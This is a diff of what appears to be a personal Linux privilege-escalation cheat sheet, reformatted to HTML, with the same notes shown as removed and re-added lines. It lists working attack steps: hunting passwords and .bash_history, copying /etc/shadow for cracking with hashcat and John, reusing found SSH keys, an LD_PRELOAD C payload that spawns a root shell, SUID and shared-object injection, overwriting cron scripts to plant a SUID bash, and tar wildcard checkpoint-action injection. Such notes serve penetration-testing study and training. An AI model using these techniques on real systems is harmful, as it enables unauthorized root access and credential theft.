@@ -67,113 +67,114 @@ $ ls -alh /var/log/postgresql/
 $ ls -alh /var/log/proftpd/
 $ ls -alh /var/log/samba/<br>
 <br>
-User enum
-
-User folders
-Whoami
-Id
-/etc/passwd/
-Grep usernames - Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null
-
-Password and sensitive file hunting
-Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null
-Locate password | more
-
-History
-
-Ls -la then cat .bash_history
-
-Write contents of /etc/passwd and /etc/shadow to 2 diff files - then use tool called unshadow
-unshadow passwordfile.txt shadowfile.txt > unshadowed.txt
-(only works if access to shadow passwd) - ls -la /etc/shadow
-Then crack with hashcat -hashcat -m 1800 unshadowex.txt wordlist.txt -O
-Crack with John - john --wordlist=/home/kali/rockyou.txt hashname.txt
-
-See if /etc/shadow is writeable - ls -la /etc/shadow
-mkpasswd -m sha-512 yourpasswordhere
-
-Finding SSH Keys
-find / -name authorized_keys 2> /dev/null
-find / -name id_rsa 2> /dev/null
-
-Should you find a rsa key - can get root shell with 2 commands
-Copy rsa key to file on attacking machine
-Run - chmod 400 rsakey
-Run ssh -i rsakey username@ip
-
-SUDO Priv Esc
-see what a user has sudo rights too - sudo -l
-should it ask for a sudo password - user has no sudo rights
-
-Should stuff come up, take the names and search on gtfobins for sudo execution on the software
-
-SUID
-Type find / -type f -perm -04000 -ls 2>/dev/null to see what software has SUID set
-use GTFO bins to look at software and see if any SUID exploits exist
-Find known exploits with SUID - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-Look for any version and google CVEs
-
-
-Sudo LD_Preload
-Sudo -l look for LD_PRELOAD at the top (pre loads a library)
-Create a file 
-#include <stdio.h>
-#include <sys/types.h>
-#include <stdlib.h>
-void _init() {
-    unsetenv("LD_PRELOAD");
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
-}
-
-Save file as x.c
-Type 
-gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
-Type 
-sudo LD_PRELOAD=/tmp/x.so service you can run as sudo with sudo -l
-Type id
-
-
-Shared Object Injection
-find / -type f -perm -04000 -ls 2>/dev/null
-Look for something we can inject (look at each path and see what each thing does, are they scripts?) Can use a tool called strace  ---- strace /location/to/path ---- have a look for errors such as missing files or directories
-strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
-Create the directory / file and add malicious code
-
-
-Capabilities
-use command getcap to list capabilities - when run as unpriv user use getcap -r / 2>/dev/null
-serach on GTFO bins for any capabilities with the software names discovered
-
-Cron Jobs
-Any user can read the file keeping system-wide cron jobs under /etc/crontab - cat /etc/crontab
-Edit any cron jobs that have permission and replace with a reverse shell using nano filename then edit. Ensure it runs as root.
-
-
-
-Means runs every minute
-Overwrite file with output such as 
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /file/path/ofcron.sh
-chmod +x ofcron.sh
-This will overwrite to tmp/bash and if you call /tmp/bash -p after the job has run it'll work
-
-Also check systemd timers ---- systemctl list-timers --all
-
-Cron Jobs with wildcard
-Tar exploitation - when identifying cron jobs (cat /etc/crontab), there may be a job running using tar and a wildcard. You may have read only rights here.
-
-E.g. A script contains this
-cd important-directory
-tar cf /var/backups/backup.tar *
-
-First CD to the directory in the script
-Add a malicious file --- echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > output.sh
-chmod +x output.sh
-touch  /directory/of/script--checkpoint=1
-touch  /directory/of/script--checkpoint-action=exec=sh\ output.sh
-/tmp/bash -p (have to wait for script to be run on timer)
-
+<h2>User enum</h2>
+<br>
+User folders<br>
+Whoami<br>
+Id<br>
+/etc/passwd/<br>
+Grep usernames - Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null<br>
+<br>
+Password and sensitive file hunting<br>
+Grep --color=auto -rnw '/' -ie "password" --color=always 2> /dev/null<br>
+Locate password | more<br>
+<br>
+History<br>
+<br>
+Ls -la then cat .bash_history<br>
+<br>
+Write contents of /etc/passwd and /etc/shadow to 2 diff files - then use tool called unshadow<br>
+unshadow passwordfile.txt shadowfile.txt > unshadowed.txt<br>
+(only works if access to shadow passwd) - ls -la /etc/shadow<br>
+Then crack with hashcat -hashcat -m 1800 unshadowex.txt wordlist.txt -O<br>
+Crack with John - john --wordlist=/home/kali/rockyou.txt hashname.txt<br>
+<br>
+See if /etc/shadow is writeable - ls -la /etc/shadow<br>
+mkpasswd -m sha-512 yourpasswordhere<br>
+<br>
+<h2>Finding SSH Keys</h2><br>
+find / -name authorized_keys 2> /dev/null<br>
+find / -name id_rsa 2> /dev/null<br>
+<br>
+Should you find a rsa key - can get root shell with 2 commands<br>
+Copy rsa key to file on attacking machine<br>
+Run - chmod 400 rsakey<br>
+Run ssh -i rsakey username@ip<br>
+<br>
+<h2>SUDO Priv Esc</h2><br>
+see what a user has sudo rights too - sudo -l<br>
+should it ask for a sudo password - user has no sudo rights<br>
+<br>
+Should stuff come up, take the names and search on gtfobins for sudo execution on the software<br>
+<br>
+<h2>SUID</h2><br>
+Type find / -type f -perm -04000 -ls 2>/dev/null to see what software has SUID set<br>
+use GTFO bins to look at software and see if any SUID exploits exist<br>
+Find known exploits with SUID - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null<br>
+Look for any version and google CVEs<br>
+<br>
+<br>
+<h2>Sudo LD_Preload</h2><br>
+Sudo -l look for LD_PRELOAD at the top (pre loads a library)<br>
+Create a file <br>
+#include <stdio.h><br>
+#include <sys/types.h><br>
+#include <stdlib.h><br>
+void _init() {<br>
+    unsetenv("LD_PRELOAD");<br>
+    setgid(0);<br>
+    setuid(0);<br>
+    system("/bin/bash");<br>
+}<br>
+<br>
+Save file as x.c<br>
+Type <br>
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles<br>
+Type <br>
+sudo LD_PRELOAD=/tmp/x.so service you can run as sudo with sudo -l<br>
+Type id<br>
+<br>
+<br>
+<h2>Shared Object Injection</h2><br>
+find / -type f -perm -04000 -ls 2>/dev/null<br>
+Look for something we can inject (look at each path and see what each thing does, are they scripts?) Can use a tool called strace  ---- strace /location/to/path ---- <br>
+have a look for errors such as missing files or directories<br>
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"<br>
+Create the directory / file and add malicious code<br>
+<br>
+<br>
+<h2>Capabilities</h2><br>
+use command getcap to list capabilities - when run as unpriv user use getcap -r / 2>/dev/null<br>
+serach on GTFO bins for any capabilities with the software names discovered<br>
+<br>
+<h2>Cron Jobs</h2><br>
+Any user can read the file keeping system-wide cron jobs under /etc/crontab - cat /etc/crontab<br>
+Edit any cron jobs that have permission and replace with a reverse shell using nano filename then edit. Ensure it runs as root.<br>
+<br>
+<br>
+<br>
+Means runs every minute<br>
+Overwrite file with output such as <br>
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /file/path/ofcron.sh<br>
+chmod +x ofcron.sh<br>
+This will overwrite to tmp/bash and if you call /tmp/bash -p after the job has run it'll work<br>
+<br>
+Also check systemd timers ---- systemctl list-timers --all<br>
+<br>
+<h2>Cron Jobs with wildcard</h2><br>
+Tar exploitation - when identifying cron jobs (cat /etc/crontab), there may be a job running using tar and a wildcard. You may have read only rights here.<br>
+<br>
+E.g. A script contains this<br>
+cd important-directory<br>
+tar cf /var/backups/backup.tar *<br>
+<br>
+First CD to the directory in the script<br>
+Add a malicious file --- echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > output.sh<br>
+chmod +x output.sh<br>
+touch  /directory/of/script--checkpoint=1<br>
+touch  /directory/of/script--checkpoint-action=exec=sh\ output.sh<br>
+/tmp/bash -p (have to wait for script to be run on timer)<br>
+<br>
 Cron Jobs with overwrite
 Check file perms of any cron jobs u find (ls -la filename.sh)
 If write permissions can overwrite file
